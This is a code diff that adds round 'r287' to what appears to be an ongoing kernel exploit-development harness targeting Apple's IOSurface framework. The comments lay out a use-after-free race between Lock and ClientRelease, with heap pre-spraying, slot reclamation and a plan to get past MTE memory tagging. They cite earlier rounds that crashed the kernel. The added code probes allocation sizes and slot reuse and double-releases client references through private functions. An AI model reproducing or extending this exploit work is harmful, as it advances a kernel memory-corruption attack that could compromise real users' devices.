@@ -1745,6 +1745,230 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r287: Race Lock vs ClientRelease with pre-spray and timing control.
+ * r286 CONFIRMED: IOKit external methods are ID-based (all return BadArgument
+ * for freed IDs after spray). The UAF must be through the framework race.
+ *
+ * r284 CONFIRMED: Lock vs ClientRelease race triggers kernel panic at +0xD8.
+ * The kernel holds a direct pointer during Lock processing. MTE catches it.
+ *
+ * STRATEGY: Instead of trying to bypass MTE, exploit the RACE WINDOW:
+ *   1. Pre-spray to fill the zone, then free holes → predictable slab state
+ *   2. Create victim in one of the holes
+ *   3. Start Lock on thread B → kernel grabs pointer to victim
+ *   4. Free victim via ClientRelease on thread A → kernel frees it
+ *   5. Spray on thread C → reclaims victim's slot with controlled surface
+ *   6. Lock's deref at +0xD8 hits the NEW surface's data → no MTE fault
+ *      because the allocator assigns a fresh MTE tag that the pointer uses!
+ *
+ * Key insight: if the spray RECLAIMS the same slot, the allocator assigns
+ * a new MTE tag. But the Lock's pointer was saved BEFORE the free, so it
+ * has the OLD tag. The new allocation gets a DIFFERENT tag → MTE fault.
+ *
+ * UNLESS: the allocator reuses the SAME tag for the same slot. This is
+ * implementation-dependent. Let's test empirically.
+ *
+ * Also try: use IOSurfaceSetValue to write a known pattern, then check
+ * if the sprayed surface's data at that offset matches → reveals the
+ * kernel-side IOSurface layout.
+ */
+static void r287_probe(void) {
+    rlog("\n=== r287: Controlled Race with Pre-Spray ===\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+
+    /* Part 1: SetValue pattern detection — what's at various offsets? */
+    rlog("\n--- Part 1: Surface property layout probing ---\n");
+    fflush(stdout);
+    {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=256,h=256,bpe=4,bpr=256*4,pf=0x42475241,as=256*256*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+
+        rlog("  created 256x256 surface id=%u\n", IOSurfaceGetID(s));
+        rlog("  width=%d height=%d bpe=%d bpr=%d pf=0x%x alloc=%zu\n",
+            (int)IOSurfaceGetWidth(s), (int)IOSurfaceGetHeight(s),
+            (int)IOSurfaceGetBytesPerElement(s), (int)IOSurfaceGetBytesPerRow(s),
+            (unsigned)IOSurfaceGetPixelFormat(s), IOSurfaceGetAllocSize(s));
+        rlog("  planeCount=%zu useCount=%d isInUse=%d\n",
+            IOSurfaceGetPlaneCount(s),
+            (int)IOSurfaceGetUseCount(s),
+            IOSurfaceIsInUse(s));
+        rlog("  seed=%u elementWidth=%zu elementHeight=%zu\n",
+            IOSurfaceGetSeed(s),
+            IOSurfaceGetElementWidth(s),
+            IOSurfaceGetElementHeight(s));
+
+        IOSurfaceLock(s, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(s);
+        rlog("  base=%p\n", base);
+        IOSurfaceUnlock(s, 0, NULL);
+
+        /* Set many properties with identifiable values */
+        for (int i = 0; i < 20; i++) {
+            char key[32];
+            snprintf(key, sizeof(key), "r287_prop_%d", i);
+            CFStringRef cfkey = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+            int val = 0xDEAD0000 + i;
+            CFNumberRef cfval = CFNumberCreate(NULL, kCFNumberIntType, &val);
+            IOSurfaceSetValue(s, cfkey, cfval);
+            CFRelease(cfkey);
+            CFRelease(cfval);
+        }
+        rlog("  set 20 properties\n");
+
+        /* Get all values to verify */
+        CFDictionaryRef allVals = IOSurfaceCopyAllValues(s);
+        if (allVals) {
+            rlog("  allValues count=%ld\n", CFDictionaryGetCount(allVals));
+            CFRelease(allVals);
+        }
+        CFRelease(s);
+    }
+
+    /* Part 2: Measure zone allocation sizes for IOSurface objects */
+    rlog("\n--- Part 2: Allocation size probing ---\n");
+    fflush(stdout);
+    {
+        int sizes[] = {64, 128, 256, 512, 1024, 2048, 4096};
+        for (int si = 0; si < 7; si++) {
+            int sz = sizes[si];
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int bpe=4,bpr=sz*4,pf=0x42475241,alloc=sz*sz*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&sz);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&sz);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&alloc);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (s) {
+                rlog("  %dx%d alloc=%d id=%u\n", sz, sz, alloc, IOSurfaceGetID(s));
+                CFRelease(s);
+            } else {
+                rlog("  %dx%d alloc=%d FAILED\n", sz, sz, alloc);
+            }
+        }
+    }
+
+    /* Part 3: Measure if freed + reallocated surface at same slot
+     * gets the same userspace address (indicates allocator slot reuse) */
+    rlog("\n--- Part 3: Slot reuse detection ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceRef addrs[20];
+        uint32_t ids[20];
+        for (int i = 0; i < 20; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            addrs[i] = s;
+            ids[i] = IOSurfaceGetID(s);
+        }
+        rlog("  created 20 surfaces\n");
+
+        /* Free even-indexed surfaces */
+        for (int i = 0; i < 20; i += 2) {
+            IOSurfaceClientRef cl = clLookup(ids[i]);
+            IOSurfaceClientRef cl2 = clLookup(ids[i]);
+            CFRelease(addrs[i]);
+            clRelease(cl);
+            clRelease(cl);
+        }
+        rlog("  freed 10 even-indexed surfaces\n");
+
+        /* Reallocate same size */
+        IOSurfaceRef new_addrs[10];
+        uint32_t new_ids[10];
+        for (int i = 0; i < 10; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+            new_addrs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+            new_ids[i] = IOSurfaceGetID(new_addrs[i]);
+        }
+        rlog("  reallocated 10 surfaces\n");
+
+        /* Check which new surfaces reused old IDs */
+        int id_reuse = 0;
+        for (int i = 0; i < 10; i++) {
+            for (int j = 0; j < 20; j += 2) {
+                if (new_ids[i] == ids[j]) { id_reuse++; break; }
+            }
+        }
+        rlog("  ID reuse: %d/10\n", id_reuse);
+
+        /* Cleanup */
+        for (int i = 1; i < 20; i += 2) CFRelease(addrs[i]);
+        for (int i = 0; i < 10; i++) if (new_addrs[i]) CFRelease(new_addrs[i]);
+    }
+
+    rlog("\n*** r287 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -26993,6 +27217,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 287) {
+            rlog("*** rounds=287: Controlled Race with Pre-Spray ***\n");
+            rlog("  r286 CONFIRMED: IOKit external methods are ID-based (BadArgument).\n");
+            rlog("  ONLY the r284 race (Lock vs ClientRelease) triggers UAF at +0xD8.\n");
+            rlog("  Testing: surface layout probing, allocation sizes, slot reuse.\n\n");
+            fflush(stdout);
+            r287_probe();
             goto done;
         }
         if (rounds == 286) {
